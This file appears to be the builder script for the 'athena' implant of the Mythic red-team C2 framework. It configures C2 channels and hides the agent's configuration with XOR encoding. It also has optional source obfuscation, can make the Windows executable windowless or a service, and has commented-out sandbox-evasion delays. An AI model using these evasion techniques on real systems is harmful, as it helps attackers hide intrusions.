import string
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from mythic_container.logging import *
from .athena_utils import plugin_utilities
from .athena_utils import plugin_registry
from .athena_utils import mac_bundler
import asyncio
import json
import os
import hashlib
import random
import sys
import shutil
import tempfile
import traceback
import subprocess
import pefile


# define your payload type class here, it must extend the PayloadType class though
class athena(PayloadType):
    name = "athena"  # name that would show up in the UI
    file_extension = "zip"  # default file extension to use when creating payloads
    author = "@checkymander"  # author of the payload type
    supported_os = [
        SupportedOS.Windows,
        SupportedOS.Linux,
        SupportedOS.MacOS,
    ]  # supported OS and architecture combos
    wrapper = False  # does this payload type act as a wrapper for another payloads inside of it?
    wrapped_payloads = ["aegis"]  # if so, which payload types. If you are writing a wrapper, you will need to modify this variable (adding in your wrapper's name) in the builder.py of each payload that you want to utilize your wrapper.
    note = """A cross platform .NET compatible agent."""
    supports_dynamic_loading = True  # setting this to True allows users to only select a subset of commands when generating a payload
    agent_path = pathlib.Path(".") / "athena" / "mythic"
    agent_code_path = pathlib.Path(".") / "athena"  / "agent_code"
    agent_icon_path = agent_path / "agent_functions" / "athena.svg"
    build_steps = [
        BuildStep(step_name="Gather Files", step_description="Preparing build environment"),
        BuildStep(step_name="Configure C2 Profiles", step_description="Configuring C2 Profiles"),
        BuildStep(step_name="Configure Agent", step_description="Updating the Agent Configuration"),
        BuildStep(step_name="Add Tasks", step_description="Adding built-in commands to the agent"),
        BuildStep(step_name="Obfuscate Sources", step_description="Applying source-level obfuscation transforms"),
        BuildStep(step_name="Compile Models Dll", step_description="Compiling Models DLL"),
        BuildStep(step_name="Compile", step_description="Compiling final executable"),
        BuildStep(step_name="Zip", step_description="Zipping final payload"),
    ]
    build_parameters = [
        #  these are all the build parameters that will be presented to the user when creating your payload
        BuildParameter(
            name="self-contained",
            parameter_type=BuildParameterType.Boolean,
            description="Indicate whether the payload will include the full .NET framework",
            default_value=True,
        ),
        BuildParameter(
            name="trimmed",
            parameter_type=BuildParameterType.Boolean,
            description="Trim unnecessary assemblies. Note: This may cause issues with non-included reflected assemblies",
            default_value=False,
        ),
        BuildParameter(
            name="compressed",
            parameter_type=BuildParameterType.Boolean,
            default_value=True,
            description="If a single-file binary, compress the final binary"
        ),
        BuildParameter(
            name="single-file",
            parameter_type=BuildParameterType.Boolean,
            description="Publish as a single-file executable",
            default_value=True,
        ),
        BuildParameter(
            name="arch",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["x64", "x86", "arm", "arm64", "musl-x64"],
            default_value="x64",
            description="Target architecture"
        ),
        BuildParameter(
            name="configuration",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["Release", "Debug"],
            default_value="Release",
            description="Select compiler configuration release/debug"
        ),
        BuildParameter(
            name="obfuscate",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="Obfuscate the final payload"
        ),
        BuildParameter(
            name="invariantglobalization",
            parameter_type=BuildParameterType.Boolean,
            default_value= False,
            description="Use Invariant Globalization (May cause issues with non-english systems)"
        ),
        BuildParameter(
            name="usesystemresourcekeys",
            parameter_type=BuildParameterType.Boolean,
            default_value= False,
            description="Strip Exception Messages"
        ),
        BuildParameter(
            name="stacktracesupport",
            parameter_type=BuildParameterType.Boolean,
            default_value= True,
            description="Enable Stack Trace message"
        ),
        BuildParameter(
            name="assemblyname",
            parameter_type=BuildParameterType.String,
            default_value=''.join(random.choices(string.ascii_uppercase + string.digits, k=10)),
            description="Assembly Name"
        ),
        # BuildParameter(
        #     name="execution-delays",
        #     parameter_type=BuildParameterType.ChooseMultiple,
        #     choices = ["calculate-pi", "agent-delay", "benign-lookup"],
        #     description="Enable execution delays to try and trick sandboxes, refer to documentation for extended information on each choice"
        # ),
        # BuildParameter(
        #     name="optimizeforsize",
        #     parameter_type=BuildParameterType.Boolean,
        #     default_value= False,
        #     description="Compile using the experimental Native AOT"
        # ),
        # BuildParameter(
        #     name="native-aot",
        #     parameter_type=BuildParameterType.Boolean,
        #     default_value= False,
        #     description="Compile using the experimental Native AOT"
        # ),
        BuildParameter(
            name="output-type",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["binary", "windows service", "source", "app bundle"],
            default_value="binary",
            description="Compile the payload or provide the raw source code"
        ),
        # BuildParameter(
        #     name="hide-window",
        #     parameter_type=BuildParameterType.Boolean,
        #     default_value=True,
        #     description="Hide the window when running the payload"
        # ),
    ]
    c2_profiles = ["http", "websocket", "slack", "smb", "discord", "github"]

    # (dir_name, config_file, assembly_for_roots, channel_class)
    PROFILE_REGISTRY = {
        "http":      ("Workflow.Channels.Http",      "HttpProfile.cs",      "Workflow.Channels.HTTP",    "HttpProfile"),
        "smb":       ("Workflow.Channels.Smb",       "SmbProfile.cs",       "Workflow.Channels.SMB",     "SmbProfile"),
        "websocket": ("Workflow.Channels.Websocket",  "WebsocketProfile.cs", "Workflow.Channels.Websocket","Websocket"),
        "discord":   ("Workflow.Channels.Discord",    "DiscordProfile.cs",   "Workflow.Channels.Discord", "DiscordProfile"),
        "github":    ("Workflow.Channels.GitHub",     "GitHubProfile.cs",    "Workflow.Channels.GitHub",  "GitHub"),
    }

    async def prepareWinExe(self, output_path):
        pe = pefile.PE(os.path.join(output_path, "{}.exe".format(self.get_parameter("assemblyname"))))
        pe.OPTIONAL_HEADER.Subsystem = 2
        pe.write(os.path.join(output_path, "Agent_Headless.exe"))
        pe.close()
        os.remove(os.path.join(output_path,"{}.exe".format(self.get_parameter("assemblyname"))))
        os.rename(os.path.join(output_path, "Agent_Headless.exe"), os.path.join(output_path, "Athena.exe"))

    def buildProfile(self, gen_dir, c2, profile_name):
        dir_name, _, assembly, _cls = self.PROFILE_REGISTRY[profile_name]

        # Collect parameters into a flat dict
        config = {}
        for key, val in c2.get_parameters_dict().items():
            if key == "AESPSK":
                continue
            if key == "encrypted_exchange_check":
                config[key] = val == "T"
            elif key == "headers":
                config[key] = val
            else:
                config[key] = val

        # Serialize to JSON
        json_bytes = json.dumps(config).encode("utf-8")

        # XOR encode with random single-byte key
        xor_key = random.randint(1, 255)
        encoded = bytes(b ^ xor_key for b in json_bytes)

        # Generate C# source with the encoded byte array
        byte_literal = ", ".join(
            "0x{:02X}".format(b) for b in encoded
        )

        # Determine namespace based on profile
        namespace = "Workflow.Channels"
        if profile_name == "websocket":
            namespace = "Workflow.Channels.Websocket"
        elif profile_name == "smb":
            namespace = "Workflow.Channels.Smb"

        cs_source = (
            "#if !CHECKYMANDERDEV\n"
            "namespace {}\n"
            "{{\n"
            "    internal static class ChannelConfig\n"
            "    {{\n"
            "        private static readonly byte[] _d = "
            "new byte[] {{ {} }};\n"
            "        private static readonly byte _k = "
            "0x{:02X};\n"
            "\n"
            "        internal static string Decode()\n"
            "        {{\n"
            "            byte[] r = new byte[_d.Length];\n"
            "            for (int i = 0; i < _d.Length; i++)\n"
            "                r[i] = (byte)(_d[i] ^ _k);\n"
            "            return System.Text.Encoding"
            ".UTF8.GetString(r);\n"
            "        }}\n"
            "    }}\n"
            "}}\n"
            "#endif\n"
        ).format(namespace, byte_literal, xor_key)

        config_path = os.path.join(gen_dir, "ChannelConfig.{}.g.cs".format(dir_name))
        with open(config_path, "w") as f:
            f.write(cs_source)

    def buildConfig(self, gen_dir, c2):
        config = {
            "uuid": self.uuid,
            "callback_interval": 60,
            "callback_jitter": 10,
            "killdate": "",
            "psk": "",
        }

        for key, val in c2.get_parameters_dict().items():
            if key == "AESPSK":
                config["psk"] = val["enc_key"] if val["enc_key"] is not None else ""
            elif key in ("callback_interval", "callback_jitter"):
                config[key] = int(val)
            elif key == "killdate":
                config[key] = str(val)

        json_bytes = json.dumps(config).encode("utf-8")

        xor_key = random.randint(1, 255)
        encoded = bytes(b ^ xor_key for b in json_bytes)

        byte_literal = ", ".join(
            "0x{:02X}".format(b) for b in encoded
        )

        cs_source = (
            "#if !CHECKYMANDERDEV\n"
            "namespace Workflow.Config\n"
            "{{\n"
            "    internal static class ServiceConfigData\n"
            "    {{\n"
            "        private static readonly byte[] _d = "
            "new byte[] {{ {} }};\n"
            "        private static readonly byte _k = "
            "0x{:02X};\n"
            "\n"
            "        internal static string Decode()\n"
            "        {{\n"
            "            byte[] r = new byte[_d.Length];\n"
            "            for (int i = 0; i < _d.Length; i++)\n"
            "                r[i] = (byte)(_d[i] ^ _k);\n"
            "            return System.Text.Encoding"
            ".UTF8.GetString(r);\n"
            "        }}\n"
            "    }}\n"
            "}}\n"
            "#endif\n"
        ).format(byte_literal, xor_key)

        config_path = os.path.join(gen_dir, "ServiceConfigData.g.cs")
        with open(config_path, "w") as f:
            f.write(cs_source)

    def writeChannelAnchor(self, gen_dir, profile_classes):
        """Generate a C# file that creates direct PE references to channel types.

        Without this, channel assemblies are ProjectReferences but have no
        code-level type usage in ServiceHost, so they don't appear in
        Assembly.GetReferencedAssemblies(). Adding a typeof() reference forces
        the compiler to emit an AssemblyRef, which survives IL obfuscation
        (the obfuscator patches both the ref and the definition consistently).
        """
        type_list = ", ".join(
            "typeof({}.{})".format(ns, cls)
            for ns, cls in profile_classes
        )
        cs_source = (
            "// Auto-generated: forces PE-level assembly reference to channel(s)\n"
            "namespace Workflow.Config\n"
            "{{\n"
            "    internal static class _ChannelRef\n"
            "    {{\n"
            "        internal static System.Type[] _Get() =>\n"
            "            new System.Type[] {{ {} }};\n"
            "    }}\n"
            "}}\n"
        ).format(type_list)
        anchor_path = os.path.join(gen_dir, "ChannelAnchor.g.cs")
        with open(anchor_path, "w") as f:
            f.write(cs_source)
        return anchor_path

    def writeBuildTargets(self, gen_dir, references, profile_dirs, profile_classes):
        """Generate an MSBuild .targets file with references and compile includes."""
        anchor_path = self.writeChannelAnchor(gen_dir, profile_classes)

        lines = ['<Project>']

        # ServiceHost: project references, config include, trimmer roots
        lines.append(
            '  <ItemGroup Condition='
            "\"'$(MSBuildProjectName)' == 'ServiceHost'\">"
        )
        for ref_path in references:
            lines.append(
                '    <ProjectReference Include="{}" />'.format(ref_path)
            )
        lines.append(
            '    <Compile Include="{}" Link="Config/ServiceConfigData.g.cs" />'.format(
                os.path.join(gen_dir, "ServiceConfigData.g.cs")
            )
        )
        lines.append(
            '    <Compile Include="{}" Link="Config/ChannelAnchor.g.cs" />'.format(
                anchor_path
            )
        )
        lines.append('    <TrimmerRootDescriptor Remove="Roots.xml" />')
        lines.append(
            '    <TrimmerRootDescriptor Include="{}" />'.format(
                os.path.join(gen_dir, "Roots.xml")
            )
        )
        lines.append('  </ItemGroup>')

        # Each profile project: inject its generated ChannelConfig
        for dir_name in profile_dirs:
            proj_name = "Workflow.Channels.{}".format(dir_name)
            lines.append(
                '  <ItemGroup Condition='
                "\"'$(MSBuildProjectName)' == '{}'\">".format(proj_name)
            )
            lines.append(
                '    <Compile Include="{}" Link="ChannelConfig.g.cs" />'.format(
                    os.path.join(gen_dir,
                                 "ChannelConfig.{}.g.cs".format(proj_name))
                )
            )
            lines.append('  </ItemGroup>')

        lines.append('</Project>')

        targets_path = os.path.join(gen_dir, "build.targets")
        with open(targets_path, "w") as f:
            f.write('\n'.join(lines))

    # def bundleApp(self, agent_build_path, rid, configuration):
    #     p = subprocess.Popen(["dotnet", "msbuild", "-t:BundleApp", "-p:RuntimeIdentifier={}".format(rid), "-p:Configuration={}".format(configuration), "-p:TargetFramework=net7.0"], cwd=os.path.join(agent_build_path.name, "Agent"))
    #     p.wait()
        
    #def bundleApp(self, output_path):


    async def returnSuccess(self, resp: BuildResponse, build_msg, agent_build_path, stdout) -> BuildResponse:
        resp.status = BuildStatus.Success
        resp.build_message = build_msg
        resp.payload = open(f"{agent_build_path.name}/output.zip", 'rb').read()
        resp.set_build_stdout(stdout)
        return resp     
    
    async def returnFailure(self, resp: BuildResponse, err_msg, build_msg) -> BuildResponse:
        resp.status = BuildStatus.Error
        resp.payload = b""
        resp.build_message = build_msg
        resp.build_stderr = err_msg
        return resp
    
    def getRid(self):
        if self.selected_os.upper() == "WINDOWS":
            return "win-" + self.get_parameter("arch")
        elif self.selected_os.upper() == "LINUX":
            return "linux-" + self.get_parameter("arch")
        elif self.selected_os.upper() == "MACOS":
                return "osx-" + self.get_parameter("arch")
        elif self.selected_os.upper() == "REDHAT":
            return "rhel-x64"
        
    async def generateRootsFile(self, gen_dir, roots_replace):
            template_path = os.path.join(
                self.agent_code_path, "ServiceHost", "Roots.xml"
            )
            baseRoots = open(template_path, "r").read()
            baseRoots = baseRoots.replace(
                "<!-- {{REPLACEME}} -->", roots_replace
            )
            out_path = os.path.join(gen_dir, "Roots.xml")
            with open(out_path, "w") as f:
                f.write(baseRoots)

    async def getBuildCommand(
        self, rid, gen_dir, obf_seed=None, obfuscator_bin=None,
    ):
            targets_path = os.path.join(gen_dir, "build.targets")
            output_path = os.path.join(gen_dir, "publish")
            cmd = (
                "dotnet publish ServiceHost -r {} -c {}"
                " --nologo --no-restore --self-contained={}"
                " --output {}"
                " /p:PublishSingleFile={}"
                " /p:EnableCompressionInSingleFile={}"
                " /p:PublishTrimmed={}"
                " /p:Obfuscate={}"
                " /p:PublishAOT={}"
                " /p:DebugType=None"
                " /p:DebugSymbols=false"
                " /p:PluginsOnly=false"
                " /p:HandlerOS={}"
                " /p:UseSystemResourceKeys={}"
                " /p:InvariantGlobalization={}"
                " /p:StackTraceSupport={}"
                " /p:PayloadUUID={}"
                " /p:WindowsService={}"
                " /p:RandomName={}"
                " /p:AthenaExternalBuildTargets={}"
            ).format(
                rid,
                self.get_parameter("configuration"),
                self.get_parameter("self-contained"),
                output_path,
                self.get_parameter("single-file"),
                self.get_parameter("compressed"),
                self.get_parameter("trimmed"),
                self.get_parameter("obfuscate"),
                False,
                self.selected_os.lower(),
                self.get_parameter("usesystemresourcekeys"),
                self.get_parameter("invariantglobalization"),
                self.get_parameter("stacktracesupport"),
                self.uuid,
                self.get_parameter("output-type") == "windows service",
                self.get_parameter("assemblyname"),
                targets_path,
            )
            if obf_seed is not None and obfuscator_bin is not None:
                cmd += (
                    f" /p:ObfSeed={obf_seed}"
                    f" /p:ObfuscatorPath={obfuscator_bin}"
                )
            return cmd
    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Error)
        try:
            # Small temp dir for generated files only (not a full source copy)
            agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid)
            gen_dir = agent_build_path.name
            source_dir = str(self.agent_code_path)

            if self.get_parameter("output-type") == "app bundle":
                if self.selected_os.upper() != "MACOS":
                    return await self.returnFailure(resp, "Error building payload: App Bundles are only supported on MacOS", "Error occurred while building payload. Check stderr for more information.")

            if self.get_parameter("output-type") == "windows service":
                if self.get_parameter("obfuscate") == True:
                    return await self.returnFailure(resp, "Error building payload: Windows service's obfuscation is not supported yet.", "Error occurred while building payload. Check stderr for more information.")

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Gather Files",
                StepStdout="Created generation directory at {}".format(gen_dir),
                StepSuccess=True
            ))

            rid = ""
            roots_replace = ""
            all_references = []
            profile_dirs = []
            # (fq_namespace, class_name) pairs — one per selected channel
            profile_classes = []

            for c2 in self.c2info:
                profile = c2.get_c2profile()
                name = profile["name"]
                if name not in self.PROFILE_REGISTRY:
                    raise Exception("Unsupported C2 profile type for Athena: {}".format(name))
                dir_name, _, assembly, chan_cls = self.PROFILE_REGISTRY[name]
                roots_replace += '<assembly fullname="{}"/>'.format(assembly) + '\n'
                self.buildProfile(gen_dir, c2, name)
                profile_short = dir_name.split(".")[-1]
                profile_dirs.append(profile_short)
                profile_classes.append((dir_name, chan_cls))
                all_references.append(
                    os.path.join("..", "Workflow.Channels.{}".format(profile_short),
                                 "Workflow.Channels.{}.csproj".format(profile_short))
                )

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Configure C2 Profiles",
                StepStdout="Successfully configured c2 profiles and added to agent",
                StepSuccess=True
            ))

            self.buildConfig(gen_dir, c2)

            # Add crypto reference
            for c2 in self.c2info:
                psk = c2.get_parameters_dict().get("AESPSK", {})
                if isinstance(psk, dict) and psk.get("enc_key") is not None:
                    all_references.append(
                        os.path.join("..", "Workflow.Security.Aes", "Workflow.Security.Aes.csproj")
                    )
                else:
                    all_references.append(
                        os.path.join("..", "Workflow.Security.None", "Workflow.Security.None.csproj")
                    )
                break

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Configure Agent",
                StepStdout="Successfully replaced agent configuration",
                StepSuccess=True
            ))

            unloadable_commands = plugin_registry.get_all_subcommands() + plugin_utilities.get_builtin_commands()

            # Resolve subcommands to their parent modules
            resolved_parents = set()
            for cmd in list(self.commands.get_commands()):
                parent = plugin_registry.get_parent(cmd)
                if parent:
                    resolved_parents.add(parent)

            # Add resolved parents and their subcommands
            for parent in resolved_parents:
                self.commands.add_command(parent)
                for sub in plugin_registry.get_subcommands(parent):
                    self.commands.add_command(sub)

            rid = self.getRid()

            # Snapshot the command list to avoid modifying collection during iteration
            for cmd in list(self.commands.get_commands()):
                if cmd in unloadable_commands:
                    continue

                # Preserve platform-specific exclusions
                if cmd == "ds" and self.selected_os.lower() == "redhat":
                    continue

                # Auto-include sub-commands for any parent plugin
                for sub in plugin_registry.get_subcommands(cmd):
                    self.commands.add_command(sub)

                try:
                    all_references.append(
                        os.path.join("..", cmd, "{}.csproj".format(cmd))
                    )
                    roots_replace += "<assembly fullname=\"{}\"/>".format(cmd) + '\n'
                except:
                    pass

            # Generate build.targets with references and compile includes
            self.writeBuildTargets(gen_dir, all_references, profile_dirs, profile_classes)

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Add Tasks",
                StepStdout="Successfully added tasks to agent",
                StepSuccess=True
            ))

            await self.generateRootsFile(gen_dir, roots_replace)

            # Source-level obfuscation
            obf_seed = None
            obfuscator_bin = None
            if self.get_parameter("obfuscate"):
                import shutil as obf_shutil
                obf_seed = int(
                    hashlib.sha256(self.uuid.encode()).hexdigest(), 16
                ) & 0x7FFFFFFF
                obfuscator_bin = os.path.join(
                    str(self.agent_code_path.resolve()),
                    "Obfuscator", "bin", "Release",
                    "net10.0", "obfuscator",
                )

                obf_source_dir = os.path.join(gen_dir, "obf_source")
                obf_shutil.copytree(
                    str(self.agent_code_path),
                    obf_source_dir,
                    ignore=obf_shutil.ignore_patterns("bin", "obj"),
                )

                rewrite_cmd = [
                    obfuscator_bin, "rewrite-source",
                    "--seed", str(obf_seed),
                    "--uuid", self.uuid,
                    "--input", obf_source_dir,
                    "--output", obf_source_dir,
                    "--map", os.path.join(
                        gen_dir, f"{obf_seed}-map.json"
                    ),
                ]
                rewrite_proc = await asyncio.create_subprocess_exec(
                    *rewrite_cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                r_stdout, r_stderr = await rewrite_proc.communicate()
                if rewrite_proc.returncode != 0:
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Obfuscate Sources",
                            StepStdout="Source rewrite failed: "
                            + r_stderr.decode(),
                            StepSuccess=False,
                        )
                    )
                    return await self.returnFailure(
                        resp,
                        "Source rewrite failed: " + r_stderr.decode(),
                        "Error during source obfuscation",
                    )

                source_dir = obf_source_dir

                await SendMythicRPCPayloadUpdatebuildStep(
                    MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Obfuscate Sources",
                        StepStdout=f"Source obfuscation complete "
                        f"(seed={obf_seed})",
                        StepSuccess=True,
                    )
                )
            else:
                await SendMythicRPCPayloadUpdatebuildStep(
                    MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Obfuscate Sources",
                        StepStdout="Skipped (obfuscation disabled)",
                        StepSuccess=True,
                    )
                )

            if self.get_parameter("output-type") == "source":
                shutil.copytree(
                    self.agent_code_path,
                    os.path.join(gen_dir, "source"),
                    ignore=shutil.ignore_patterns("bin", "obj"),
                )
                shutil.make_archive(
                    os.path.join(gen_dir, "output"), "zip",
                    os.path.join(gen_dir, "source"),
                )
                return await self.returnSuccess(resp, "File built succesfully!", agent_build_path, "Source Exported")

            # Single restore with external build targets
            targets_path = os.path.join(gen_dir, "build.targets")
            restoreCmd = "dotnet restore ServiceHost -r {} /p:HandlerOS={} /p:WindowsService={} /p:AthenaExternalBuildTargets={}".format(
                rid, self.selected_os.lower(),
                self.get_parameter("output-type") == "windows service",
                targets_path)
            try:
                restoreProc = await asyncio.create_subprocess_shell(
                    restoreCmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    cwd=source_dir,
                )
                r_stdout, r_stderr = await restoreProc.communicate()
                if restoreProc.returncode != 0:
                    return await self.returnFailure(resp, "Error restoring packages: " + str(r_stdout) + '\n' + str(r_stderr), "Error occurred while restoring packages. Check stderr for more information.")
            except Exception as e:
                logger.critical(e)
                return await self.returnFailure(resp, str(traceback.format_exc()), str(e))

            # Models are built transitively via dotnet publish ServiceHost
            await SendMythicRPCPayloadUpdatebuildStep(
                MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Compile Models Dll",
                    StepStdout="Built transitively",
                    StepSuccess=True,
                )
            )

            # Note: If AOT is re-enabled, add mutual exclusion check:
            # if self.get_parameter("obfuscate") and aot_enabled:
            #     return await self.returnFailure(...)

            command = await self.getBuildCommand(
                rid, gen_dir, obf_seed, obfuscator_bin,
            )

            if self.get_parameter("trimmed") == True:
                command += " /p:OptimizationPreference=Size"

            output_path = os.path.join(gen_dir, "publish")

            try:
                logger.info("Executing Command: " + command)
                proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
                                                            stderr=asyncio.subprocess.PIPE,
                                                            cwd=source_dir)
            except Exception as e:
                build_stdout, build_stderr = await proc.communicate()
                logger.critical(e)
                logger.critical("command: {}".format(command))
                return await self.returnFailure(resp, str(traceback.format_exc()), e)

            build_stdout, build_stderr = await proc.communicate()
            logger.critical("stdout: " + str(build_stdout))
            logger.critical("stderr: " + str(build_stderr))
            sys.stdout.flush()

            if proc.returncode != 0:
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Compile",
                    StepStdout="Error occurred while building payload. Check stderr for more information.",
                    StepSuccess=False
                ))

                return await self.returnFailure(resp, "Error building payload: " + str(build_stdout) + '\n' + str(build_stderr) + '\n' + command, "Error occurred while building payload. Check stderr for more information.")

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Compile",
                    StepStdout="Successfully compiled payload",
                    StepSuccess=True
                ))

            if self.selected_os.lower() == "windows" and self.get_parameter("configuration") != "Debug":
                await self.prepareWinExe(output_path)

            if self.get_parameter("output-type") == "app bundle":
                mac_bundler.create_app_bundle("Agent", os.path.join(output_path, "Agent"), output_path)
                os.remove(os.path.join(output_path, "Agent"))

            shutil.make_archive(os.path.join(gen_dir, "output"), "zip", output_path)

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Zip",
                    StepStdout="Successfully zipped payload",
                    StepSuccess=True
                ))

            return await self.returnSuccess(resp, "File built succesfully!", agent_build_path, str(build_stdout))
        except:
            return await self.returnFailure(resp, str(traceback.format_exc()), "Exception in builder.py")
    
    
